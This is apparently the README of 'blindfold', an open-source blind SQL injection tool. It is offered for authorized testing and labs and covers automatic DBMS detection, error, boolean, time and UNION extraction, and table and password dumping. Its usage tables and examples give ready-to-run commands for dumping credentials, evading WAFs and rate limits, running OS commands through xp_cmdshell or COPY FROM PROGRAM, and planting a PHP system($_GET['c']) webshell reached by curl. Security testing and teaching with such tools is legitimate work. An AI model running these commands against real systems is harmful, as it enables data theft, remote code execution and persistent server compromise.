# blindfold

A small, dependency-light **blind SQL injection extractor** with **automatic DBMS
detection** and **three techniques**, chosen for you.

Point it at any injectable parameter and it works out *where* the injection breaks
out, *which database* is behind it, and the *fastest way* to pull data — then dumps
the value. No sqlmap; only `requests`.

> **blindfold** auto-detects the DBMS (PostgreSQL, MySQL, MSSQL, Oracle) and the best
> blind technique (error / boolean / time), then extracts. Formerly `pg-time-blind`.

---

## ⚠️ Legal / ethical use

For **authorized security testing and education only** — your own systems, lab machines
(OffSec PG, HackTheBox), or targets you have **explicit written permission** to test.
Unauthorized access is illegal in most jurisdictions. You alone are responsible for use.

---

## How it works — two phases

**Phase 1 — Detection**

1. **Context** — finds how the injection breaks out: string vs numeric, `AND` / `OR`, or stacked.
2. **DBMS** — fingerprints the backend automatically (PostgreSQL, MySQL, MSSQL, Oracle).
3. **Technique** — picks the fastest available:
   - **union-based** — when output is reflected, reads each value in **one request** via `UNION SELECT`.
   - **error-based** — forces a DB error that reflects the value; dumps it in **one request**.
   - **boolean-based** — auto-calibrates a TRUE/FALSE signal (status code → body length → digit-stripped token).
   - **time-based** — `pg_sleep` / `SLEEP` / `WAITFOR` oracle; last resort.

**Phase 2 — Extraction**

- **error-based**: whole value in one shot (chunked automatically when the DBMS truncates
  its error text, e.g. MySQL `extractvalue` ≈ 32 chars).
- **boolean / time**: per-character binary search (~7 requests/char). Boolean extraction
  can run in parallel with `--threads`.

---

## Safety

`OR`-based contexts can change application state (`' OR 1=1` may match every row / log you
in). They are **disabled by default**. Pass `--allow-or` to include them.

---

## Resume / memory

Progress **and** the detected DBMS/technique/context are checkpointed after every character.
If a run is interrupted, re-run the **same command** to resume. `--fresh` ignores a
checkpoint; `--state PATH` chooses the file. It is deleted automatically on success.

---

## Requirements

- Python 3.7+
- [`requests`](https://pypi.org/project/requests/)

```bash
pip install -r requirements.txt
```

---

## Quick start

```bash
git clone https://github.com/SirReddington/blindfold.git
cd blindfold
pip install -r requirements.txt
python3 blindfold.py --help
```

---

## Modes

blindfold has one default and two explicit actions — you usually only need the default:

| You run… | It does |
|----------|---------|
| *(nothing)* | **Map mode (default)** — detect, then print **DBMS · current database · table list**. Quiet (no columns/rows). |
| `--dump TABLE` | Auto-discovers the table's columns and dumps its rows (capped by `--max-rows`, default 50). |
| `--query "<SQL scalar>"` | Power mode — extract one specific value. |

```bash
# map the database (the everyday command)
blindfold.py -u http://t:3000/login -d "username=INJECT&password=test"

# dump a table
blindfold.py -u http://t:3000/login -d "username=INJECT&password=test" --dump users

# extract one scalar
blindfold.py -u http://t:3000/login -d "username=INJECT&password=test" \
  --query "SELECT password FROM users WHERE username='antwon'"
```

## Usage

```
python3 blindfold.py [target] [action] [detection] [tuning]
```

### Target (choose one style)

| Flag | Meaning |
|------|---------|
| `-u, --url`    | Target URL (may contain the marker for GET injection) |
| `-d, --data`   | Request body (may contain the marker) |
| `-H, --header` | Extra header `'Name: value'`, repeatable (may contain the marker) |
| `-X, --method` | HTTP method (default: `POST` if `-d` given, else `GET`) |
| `--request`    | Raw HTTP request file containing the marker |
| `--proto`      | Force the scheme for `--request` files. Default: **auto-probe HTTPS, then fall back to HTTP** |

### Action (default: map the database)

| Flag | Meaning |
|------|---------|
| *(none)*      | Map mode — DBMS, current database, and table names |
| `--dump TABLE`| Dump rows of a table (columns auto-discovered) |
| `--max-rows`  | Row cap for `--dump` (default `50`) |
| `--wordlist`  | Extra candidate names for gentle table/column probing on length-capped points (file, one name per line) |
| `--query`     | Extract a single SQL scalar (power mode) |
| `--rce [CMD]` | OS command execution via the DBMS (no CMD = interactive shell) |
| `--webshell`  | Drop a webshell file, verify it, and report the path |

### Injection

| Flag | Meaning |
|------|---------|
| `--marker`    | Placeholder for the injection point (default `INJECT`) |
| `--no-encode` | Do **not** URL-encode the payload |

### Detection

| Flag | Meaning |
|------|---------|
| `--dbms`          | Pin the DBMS: `postgresql`, `mysql`, `mssql`, `oracle` (skips fingerprinting) |
| `--force-boolean` | Only use boolean-based |
| `--force-time`    | Only use time-based |
| `--force-error`   | Only use error-based (skip boolean/time probing) |
| `--no-error`      | Don't use error-based even if available |
| `--no-union`      | Don't try UNION (reflected) extraction |
| `--union-cols`    | Max columns to probe for UNION (default `12`) |
| `--tamper`        | WAF evasion (comma-separated): `space2comment`, `randomcase`, `charencode` |
| `--allow-or`      | Include risky `OR` contexts (may change app state) |
| `--true-match`    | String present **only** in a TRUE response (overrides calibration) |
| `--false-match`   | String present **only** in a FALSE response |
| `--len-margin`    | Min body-length gap to treat as a boolean signal (default `12`) |

### Tuning

| Flag | Default | Meaning |
|------|---------|---------|
| `--sleep`        | `3.0` | Seconds for the time-based sleep |
| `--threshold`    | *adaptive* | Absolute "slept" cutoff. Default: sampled baseline latency + margin |
| `--cal-samples`  | `5` | Baseline latency samples for the adaptive threshold |
| `--retries`      | `1` | Time-oracle samples per check (majority vote; beats jitter) |
| `--net-retries`  | `2` | Transport-level retries on connection errors (with backoff) |
| `--threads`      | `1` | Parallel workers for **boolean** extraction (each char is verified) |
| `--maxlen`       | `4096` | Max value length / binary length-probe cap |
| `--charset`      | – | Restrict to a known alphabet for speed: `hex`/`HEX`/`digits`/`alnum` or a literal set (e.g. hashes drop to ~4 req/char) |
| `--timeout`      | `30` | HTTP timeout seconds (auto-raised above `--sleep` for time-based) |
| `-v, --verbose`  | off | Show detection internals (probe status/length + chosen discriminator) |
| `--ascii`        | off | ASCII-only target: skip the Unicode probe (1 fewer request/char) |
| `--max-codepoint`| `0x10FFFF` | Upper bound for Unicode (non-ASCII) character extraction |
| `--proxy`        | – | e.g. `http://127.0.0.1:8080` (Burp) or `socks5://127.0.0.1:1080` |
| `--insecure`     | off | Skip TLS verification (and silence its warning) for self-signed lab hosts |
| `--delay`        | `0` | Seconds to wait before each request (rate-limit / 504 evasion) |
| `--jitter`       | `0` | Add a random `0..N` seconds on top of `--delay` |

### Resume

| Flag | Meaning |
|------|---------|
| `--state` | Checkpoint file path (default: auto-named `.blindfold-<id>.json`) |
| `--fresh` | Ignore any existing checkpoint and start over |

---

## DBMS support matrix

| DBMS | Fingerprint | Error-based | Boolean | Time-based |
|------|-------------|-------------|---------|------------|
| PostgreSQL | `pg_catalog` | `CAST(... AS int)` | ✅ | `pg_sleep` (inline + stacked) |
| MySQL | `CONNECTION_ID()` | `extractvalue` (chunked) | ✅ | `SLEEP` (inline) |
| MSSQL | `@@version` | `CAST/convert` | ✅ | `WAITFOR DELAY` (stacked) |
| Oracle | `v$version` | – | ✅ | – |

Oracle uses boolean extraction (its inline time/error primitives are intentionally left
out for reliability). Pin any backend with `--dbms` to skip fingerprinting.

---

## Examples

**1. Fully automatic — detect context, DBMS and technique, then extract**

```bash
python3 blindfold.py \
  -u http://10.10.10.10:3000/login \
  -d "username=INJECT&password=test" \
  --query "SELECT password FROM users WHERE username='admin'"
```

**2. Reuse a saved Burp request** (put `INJECT` where the payload goes)

```bash
python3 blindfold.py --request req.txt --query "SELECT current_user"
```

**3. Pin MySQL, allow risky OR contexts**

```bash
python3 blindfold.py --request req.txt --dbms mysql --allow-or \
  --query "SELECT current_user()"
```

**4. Speed up boolean extraction with 8 workers**

```bash
python3 blindfold.py -u "http://target/item?id=INJECT" --threads 8 \
  --query "SELECT version()"
```

**5. Force time-based and help the calibrator on a noisy page**

```bash
python3 blindfold.py -u http://t/login -d "username=INJECT&password=x" \
  --force-time --true-match "Dashboard" \
  --query "SELECT current_user"
```

**6. Visible-error target (no boolean/time signal) — error-based self-detects the DBMS**

```bash
python3 blindfold.py --request req.txt \
  --query "SELECT password FROM users WHERE username='administrator'"
# pin it to error-based with --force-error if you want to skip boolean/time probing
```

---

## Sample output

```
=== PHASE 1: detection ===
[*] boolean probe : string-and ...
[+] boolean signal on string-and: status==302
[+] DBMS fingerprint: postgresql
[*] error probe   : postgresql/string-and ...
[+] error reflection on string-and (postgresql)

[+] DBMS      : postgresql
[+] TECHNIQUE : error-based
[+] CONTEXT   : string-and
[*] detection cost: 11 requests

=== PHASE 2: extraction ===
[*] query : SELECT password FROM users WHERE username='admin'

[+] RESULT: s3cr3tP@ss!
[*] total requests: 12  (error-based, postgresql)
```

When nothing reflects and boolean has no signal, it falls back to time:

```
[+] DBMS      : postgresql
[+] TECHNIQUE : time-based
[+] CONTEXT   : stacked
```

Default **map mode** output (no `--query`):

```
=== DATABASE MAP ===
DBMS     : postgresql
Database : shopdb
Tables   : 3
  - users
  - products
  - orders

[i] dump a table with:  --dump <table>   (rows capped by --max-rows)
```

And `--dump users`:

```
=== DUMP: users ===
columns (3): id, username, password
rows: 3

id | username | password
---+----------+---------
1  | admin    | s3cr3t
2  | bob      | hunter2
3  | eve      | p@ss
```

---

## Useful queries to feed `--query`

| Goal | PostgreSQL / MySQL | MSSQL | Oracle |
|------|--------------------|-------|--------|
| Current user | `SELECT current_user` | `SELECT SYSTEM_USER` | `SELECT user FROM dual` |
| Version | `SELECT version()` | `SELECT @@version` | `SELECT banner FROM v$version WHERE rownum=1` |
| Current DB | `SELECT current_database()` / `SELECT database()` | `SELECT DB_NAME()` | `SELECT ora_database_name FROM dual` |
| List users | `SELECT string_agg(usename,',') FROM pg_user` | `SELECT name FROM sys.sql_logins` | `SELECT username FROM all_users` |
| Dump a password | `SELECT password FROM users WHERE username='admin'` | same | same |

---

## RCE — `--rce` and `--webshell`

> **Authorized testing only.** Both need high DB privileges. They run after detection and
> skip data extraction.

Two strategies, chosen by what the DBMS supports:

**`--rce` — direct command execution** (output read back through the detected oracle):

| DBMS | Mechanism | Requires |
|------|-----------|----------|
| PostgreSQL | `COPY ... FROM PROGRAM` → output table → read back | superuser |
| MSSQL | enable + `xp_cmdshell` → output table → read back | sysadmin |
| MySQL / Oracle | no direct exec → use `--webshell` | – |

**`--webshell` — drop a file and verify it** (`LOAD_FILE` / `pg_read_file` confirm the write
through the blind channel, then the confirmed path is printed):

| DBMS | Mechanism | Requires |
|------|-----------|----------|
| MySQL | `INTO DUMPFILE` (hex payload, raw) | `FILE` priv + permissive `secure_file_priv` |
| PostgreSQL | `COPY (...) TO` | superuser |
| MSSQL / Oracle | not supported | – |

```bash
# command execution
blindfold.py -u http://t:3000/login -d "username=INJECT&password=test" --rce "id"
blindfold.py -u http://t:3000/login -d "username=INJECT&password=test" --rce   # shell

# webshell: try common web roots (+ ../ traversal for MySQL), verify, report the path
blindfold.py --request req.txt --dbms mysql --webshell

# webshell at a known path
blindfold.py --request req.txt --dbms mysql --webshell --os-path /var/www/html/s.php
# then: curl 'http://<target>/s.php?c=id'
```

### RCE / webshell options

| Flag | Meaning |
|------|---------|
| `--os-path`       | Target file path or web-root dir for `--webshell` (else common roots are tried) |
| `--shell-name`    | Webshell filename (default `bf.php`) |
| `--shell-payload` | Custom webshell content (default: a PHP `system($_GET['c'])` shell) |

---

## Tips

- **Let detection choose** — UNION/error are one-shot; boolean next; time last. Override only when needed.
- For **hashes**, add `--charset hex` (≈4 req/char) and crack offline.
- If calibration mis-fires on a dynamic page, use `--true-match`/`--false-match` or raise `--len-margin`.
- Behind a WAF, try `--tamper space2comment,randomcase` (and `charencode` for strict filters).
- Interrupted? Re-run the **same** command to resume.
- **`--request` over HTTPS just works** — the scheme is auto-probed (HTTPS first, HTTP fallback). Force it with `--proto https` / `--proto http`.
- Found nothing? blindfold prints a **baseline-vs-injected diagnostic** telling you whether the
  request itself is rejected (scheme / host / session), only the payload is rejected (WAF /
  encoding), or responses simply don't change — then try `--allow-or`, `--dbms`,
  `--force-time` / `--force-error`, or check marker placement.

## Contributing

Issues and PRs welcome — especially Oracle time/error primitives, more injection contexts, and additional `--tamper` modules.

## License

[MIT](LICENSE)
